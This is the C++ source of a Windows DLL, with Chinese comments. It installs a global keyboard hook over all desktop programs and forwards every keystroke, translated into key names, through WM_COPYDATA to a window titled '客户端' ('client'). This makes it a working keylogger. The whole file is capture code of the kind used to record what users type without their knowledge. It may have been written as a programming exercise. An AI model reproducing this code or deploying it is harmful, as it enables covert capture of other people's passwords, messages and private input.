// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include <stdio.h>



//#include <windows.h>
#include <map>
#include <string>
#include <iostream>

using namespace std;




//C main 程序入口点

//需要提供钩子回调函数



HHOOK g_hhk;
HMODULE g_hModule;
HWND g_hWnd;


typedef map<int, string> IntStringMap;
IntStringMap m;
void mapmap() {
	m.insert(pair<int, string>(VK_F1, "F1"));
	m.insert(pair<int, string>(VK_F2, "F2"));
	m.insert(pair<int, string>(VK_F3, "F3"));
	m.insert(pair<int, string>(VK_F4, "F4"));
	m.insert(pair<int, string>(VK_F5, "F5"));
	m.insert(pair<int, string>(VK_F6, "F6"));
	m.insert(pair<int, string>(VK_F7, "F7"));
	m.insert(pair<int, string>(VK_F8, "F8"));
	m.insert(pair<int, string>(VK_F9, "F9"));
	m.insert(pair<int, string>(VK_F10, "F10"));
	m.insert(pair<int, string>(VK_F11, "F11"));
	m.insert(pair<int, string>(VK_F12, "F12"));
	m.insert(pair<int, string>(VK_ESCAPE, "Esc"));
	m.insert(pair<int, string>(VK_TAB, "Tab"));
	m.insert(pair<int, string>(VK_CAPITAL, "Caps Lock"));
	m.insert(pair<int, string>(VK_SHIFT, "Shift"));
	m.insert(pair<int, string>(VK_CONTROL, "Ctrl"));
	m.insert(pair<int, string>(VK_MENU, "Alt"));
	m.insert(pair<int, string>(VK_PAUSE, "Pause"));
	m.insert(pair<int, string>(VK_CLEAR, "Clear"));
	m.insert(pair<int, string>(VK_SPACE, "Space"));
	m.insert(pair<int, string>(VK_PRIOR, "Page Up"));
	m.insert(pair<int, string>(VK_NEXT, "Page Down"));
	m.insert(pair<int, string>(VK_END, "END"));
	m.insert(pair<int, string>(VK_HOME, "Home"));
	m.insert(pair<int, string>(VK_LEFT, "Left Arrow"));
	m.insert(pair<int, string>(VK_UP, "Up Arrow"));
	m.insert(pair<int, string>(VK_RIGHT, "Right Arrow"));
	m.insert(pair<int, string>(VK_DOWN, "Down Arrow"));
	
}





//键盘钩子回调函数
LRESULT CALLBACK KeyboardProc(
	int code,
	WPARAM wParam,
	LPARAM lParam
)
{
	//调试输出工具，输出调试字符串
	//写日志

	//虚拟键 我们的键盘在我们的windows中用一些宏来表示
	unsigned int nVkCode = wParam;
	//表示按了A-Z
	char szBuf[11] = {0};
	
	
	if (nVkCode >= 'A' && nVkCode <= 'Z') {
		
		//OutputDebugStringA(szBuf);
		//改成向我们的主窗口发送我们的键盘消息 WM_COPYDATA 消息
		if (GetKeyState(VK_CAPITAL) & 1) {
			sprintf_s(szBuf, "%c\n", nVkCode);
		}
		else
		{
			sprintf_s(szBuf, "%c\n", nVkCode+32);
		}

	}
	else if (nVkCode >= '0' && nVkCode <= '9') {
		sprintf_s(szBuf, "%c", nVkCode);
	}
	else {
		sprintf_s(szBuf, "%s", m[wParam].c_str());
	}
	

	COPYDATASTRUCT cds;
	cds.dwData = 0;
	cds.cbData = strlen(szBuf) + 1;		//表示数据的长度
	cds.lpData = szBuf;	//表示数据
	SendMessage(
		g_hWnd,		//向目标窗口发送消息
		WM_COPYDATA,		//消息
		(WPARAM)g_hWnd,		//表示当前自己的窗口句柄，可以不写
		(LPARAM)&cds		//构建一个结构体，用于数据传输
	);


	//OutputDebugStringA("key board pressed!");
	//AfxMessageBox(_T("key board pressed!"));
	//调用下一个钩子
	return CallNextHookEx(
		g_hhk,
		code,
		wParam,
		lParam
	);
}

//DLL导出函数，提供给其他程序使用

BOOL MySetHook(HWND hWnd) {
	g_hWnd = hWnd;
	g_hhk = SetWindowsHookEx(
		WH_KEYBOARD,	//要钩的类型，键盘钩子。
		(HOOKPROC)KeyboardProc,	//回调函数
		g_hModule,			//表示第三方的注入DLL，全局钩子使用,DLL的模块句柄
		0	//线程id,填0表示钩所有桌面程序
	);
	if (g_hhk == NULL) {
		return FALSE;
	}
	return TRUE;
}




BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        //当DLL被加载时调用,这里编写初始化操作
		g_hModule = hModule;
		g_hWnd = FindWindowA(NULL, "客户端");
		mapmap();

    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    {
        //当DLL被释放时调用
        //编写反初始化操作
    }
        break;
    }
    return TRUE;
}

